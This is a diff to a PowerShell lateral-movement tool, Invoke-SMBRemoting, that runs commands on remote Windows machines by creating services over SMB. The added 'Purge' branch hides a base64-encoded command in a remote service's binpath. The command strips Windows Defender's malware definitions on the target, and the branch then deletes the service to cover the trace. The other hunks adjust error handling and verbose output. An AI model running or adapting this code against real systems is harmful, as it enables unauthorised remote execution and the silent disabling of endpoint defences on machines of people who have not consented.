@@ -80,9 +80,26 @@ function Invoke-SMBRemoting {
 	}
 
  	$trigtgs = '\\' + $ComputerName + '\c$'
+	$Error.clear()
    	ls $trigtgs | Out-Null
+	if($Error[0]){
+		if($Error -match "Access is denied"){
+			Write-Output "[-] Access is denied"
+			Write-Output ""
+		} else {
+			Write-Output "[-] $Error"
+			Write-Output ""
+		}
+		break
+	}
 	
 	if($Purge){
+		
+		if($Verbose){
+			Write-Output "[+] Service Name: $ServiceName"
+			Write-Output "[+] Creating Service on Remote Target..."
+		}
+		
 		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc JgAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAXABNAHAAQwBtAGQAUgB1AG4ALgBlAHgAZQAnACAALQBSAGUAbQBvAHYAZQBEAGUAZgBpAG4AaQB0AGkAbwBuAHMAIAAtAEEAbABsAA==`""
 	
 		$startarguments = "\\$ComputerName start $ServiceName"
@@ -91,11 +108,29 @@ function Invoke-SMBRemoting {
 		
 		Start-Sleep -Milliseconds 1000
 		
+		if($Verbose){
+			Write-Output "[+] Service created"
+		}
+		
 		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
 		
-		Start-Sleep -Milliseconds 1000
+		Start-Sleep -Milliseconds 3000
+		
+		if($Verbose){
+			Write-Output "[+] Service started"
+		}
+		
+		$stoparguments = "\\$ComputerName delete $ServiceName"
+		
+		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
+		
+		if($Verbose){
+			Write-Output "[+] Service deleted"
+		}
 		
 		Write-Output "[+] Done!"
+		
+		Write-Output ""
 		
 		break
 	}
@@ -167,18 +202,16 @@ while (`$true) {
 	
 	if($Verbose){
 		if($ModifyService){
-			Write-Output ""
-			Write-Output " [+] Pipe Name: $PipeName"
-			Write-Output " [+] Service Name: $ServiceName"
-			Write-Output " [+] Original binPath: $originalBinPath"
-			Write-Output " [+] Modifying Service on Remote Target..."
+			Write-Output "[+] Pipe Name: $PipeName"
+			Write-Output "[+] Service Name: $ServiceName"
+			Write-Output "[+] Original binPath: $originalBinPath"
+			Write-Output "[+] Modifying Service on Remote Target..."
 			Write-Output ""
 		}
 		else{
-			Write-Output ""
-			Write-Output " [+] Pipe Name: $PipeName"
-			Write-Output " [+] Service Name: $ServiceName"
-			Write-Output " [+] Creating Service on Remote Target..."
+			Write-Output "[+] Pipe Name: $PipeName"
+			Write-Output "[+] Service Name: $ServiceName"
+			Write-Output "[+] Creating Service on Remote Target..."
 			Write-Output ""
 		}
 	}
@@ -331,6 +364,7 @@ while (`$true) {
 			}
 		}
 	}
+	
 	if($ModifyService){
 		$stopArguments = "\\$ComputerName stop $ServiceName"
 		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
